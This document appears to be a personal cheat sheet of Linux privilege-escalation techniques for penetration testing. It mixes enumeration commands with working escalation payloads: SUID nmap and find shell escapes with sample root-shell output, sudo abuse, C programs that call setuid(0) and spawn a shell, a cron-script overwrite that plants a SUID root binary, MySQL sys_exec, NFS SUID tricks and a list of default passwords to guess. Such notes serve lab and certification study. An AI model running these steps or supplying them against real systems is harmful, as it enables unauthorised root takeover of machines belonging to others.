# Linux Scripts for Priv escalation :

1. Kernel exploits
Requirements : file transfers tools like FTP, TFTP, SCP, wget, and curl
The infamous DirtyCow exploit – Linux Kernel <= 3.19.0-73.8

2. Exploiting services which are running as root 
check if web servers, mail servers, database servers, etc. are running as root.
netstat -antup : It shows you all the ports which are open and are listening
ps -aux | grep root – It shows us the services which are running as root.
Eg : EternalBlue and SambaCry exploit , Exploiting a vulnerable version of MySQL which is running as root

Processes running as root that don't have any business doing that. Mysql is a big offender here; if it's running as root you probably want to have a go at it
Try to login and issue below command for SQL 
select sys_exec('whoami');
select sys_eval('whoami');
or raptor SQL method  http://dillidba.blogspot.com/2016/01/get-root-shell-access-using-mysql-with.html

3. Exploiting SUID Executables and any root owned file that can be written

find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;

find / -perm -222 -type d 2>/dev/null ( World writable files)
find . -writable ( writable by the user )

SUID bit on any file editor/compiler/interpreter

FOR nmap :
Eg : if namp has SUID set

$ nmap –interactive – runs nmap interactive mode
$ nmap !sh – Lets you escape to the system shell from nmap shell
nmap -v   to check version
nmap 2.02 to 5.21 are vulnerable

exploit/unix/local/setuid_nmap



www-data@metasploitable:/var/tmp$ TF=$(mktemp)
www-data@metasploitable:/var/tmp$ echo 'os.execute("/bin/sh")' > $TF
www-data@metasploitable:/var/tmp$ /usr/bin/nmap localhost --script=$TF
Starting Nmap 4.53 ( http://insecure.org ) at 2020-04-26 14:45 EDT
SCRIPT ENGINE: Warning: Loading '/tmp/tmp.FrEHDD5051' - the recommended file extension is '.nse'.
sh-3.2#
sh-3.2# whoami


find kartk -exec whoami \;
Known Linux executables that can allow privilege escalation are:

Nmap
Vim,Vi
find
Bash
More
Less
Nano
cp
awk
docker
file viewer
mv
ftp / sftp
git
mount
rsync
scripting languages - lua,python,perl,ruby
tar
tcpdump
wget
zip

Some know SUID normally present in linux





SUID3NUM
https://null-byte.wonderhowto.com/how-to/find-exploit-suid-binaries-with-suid3num-0215789/
https://gtfobins.github.io/#
https://github.com/Anon-Exploiter/SUID3NUM


Python script that can find SUID binaries, distinguish between default and custom ones, and attempt to exploit them using the GTFOBins repository
GTFOBins is an impressive collection of Unix binaries that can be utilized for privilege escalation


SUID for symlinks like cp is SUID 

4. Exploiting SUDO rights/user  : https://pure.security/how-i-got-root-with-sudo/

sudo -l – Prints the commands which we are allowed to run as SUDO

Eg : sudo find /home -exec sh -i \;

awk,bash,cp,find,ht,less,more,mv,man,nano,nc,nmap,python/perl/ruby/lua/etc, vi/vim  : https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html


5. Exploiting badly configured cron jobs
ls -la /etc/cron.d – prints cron jobs which are already present in cron.d
$ find / -perm -2 -type f 2>/dev/null – prints world writable files
$ ls -la /usr/local/sbin/cron-logrotate.sh – Let’s confirm if the cron-logrotate.sh is world writable


crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root

Eg :

int main(void)
{
setgid(0);
setuid(0);
execl("/bin/sh","sh",0);
}

echo “chown root:root /tmp/rootme; chmod u+s /tmp/rootme;”>/usr/local/sbin/cron-logrotate.sh

./rootme


6. Exploiting users with ‘.’ in their PATH : https://hackmag.com/security/reach-the-root/

check using echo $PATH

With ‘.’ in path – program
Without ‘.’ in path – ./program

$ PATH=.:${PATH} – adds ‘.’ in the PATH variable


7. Some weird custom SW which not part of linux distros official package --  ///use a script to find 
8. If your "netstat -antp" shows listening services that only accept 127.0.0.1 or are otherwise filtered by iptables, immediately tunnel them out via SSH and poke at them from your kali box. Also, try netstat -anlp, netstat -ano
9. Known bad packages with SUID executables. While reading through the list of SUID binaries, it's worth looking at their package version (privchecker will get that for you) and making sure they aren't vulnerable to privesc exploits. Exim is a good example of this.
10. Strangeness in the common "sensitive" files. Know the permissions of /etc/passwd, /etc/shadow, /etc/cron* by heart, as well as the common service config files, and be ready to spot when you can read or write something you shouldn't
11. always worth taking a very close look at everything you find on your user's home directory. If you find config files, scripts, binaries, text files
12. Weak/reused/plaintext passwords


    Check file where webserver connect to database (config.php or similar)
    Check databases for admin passwords that might be reused
    Check weak passwords

username:username
username:username1
username:root
username:admin
username:qwerty
username:password

Check plaintext password

# Anything interesting the the mail?
/var/spool/mail
./LinEnum.sh -t -k password


13. Unmounted filesystems : Here we are looking for any unmounted filesystems. If we find one we mount it and start the priv-esc process over again.

mount -l
cat /etc/fstab
 

14. NFS Share : 

If you find that a machine has a NFS share you might be able to use that to escalate privileges. Depending on how it is configured.

# First check if the target machine has any NFS shares
showmount -e 192.168.1.101

# If it does, then mount it to you filesystem
mount 192.168.1.101:/ /tmp/

If that succeeds then you can go to /tmp/share. There might be some interesting stuff there. But even if there isn't you might be able to exploit it.

If you have write privileges you can create files. Test if you can create files, then check with your low-priv shell what user has created that file. If it says that it is the root-user that has created the file it is good news. Then you can create a file and set it with suid-permission from your attacking machine. And then execute it with your low privilege shell.

This code can be compiled and added to the share. Before executing it by your low-priv user make sure to set the suid-bit on it, like this:

chmod 4777 exploit

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main()
{
    setuid(0);
    system("/bin/bash");
    return 0;
}

15. Manual page command :  manual ls 
then !/bin/sh (check brainplan vulnhub)

14. tmux -S /.devs/devs_sess   : If it is root owned , to get a tmux session as root
